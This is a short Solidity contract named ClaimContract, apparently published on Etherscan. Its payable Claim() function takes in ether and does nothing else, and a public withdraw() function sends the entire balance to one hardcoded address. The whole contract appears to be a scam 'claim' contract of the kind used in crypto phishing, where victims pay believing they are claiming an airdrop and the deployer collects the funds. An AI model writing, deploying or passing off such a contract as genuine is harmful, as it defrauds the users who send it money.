/**
 *Submitted for verification at Etherscan.io on 2023-04-15
*/

// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.18;

contract ClaimContract {

    function withdraw() public {
        payable(0x450eEF560366aE40ed7C8262B0786Ce1a920c887).transfer(address(this).balance);
    }

    function Claim() public payable {
    }
}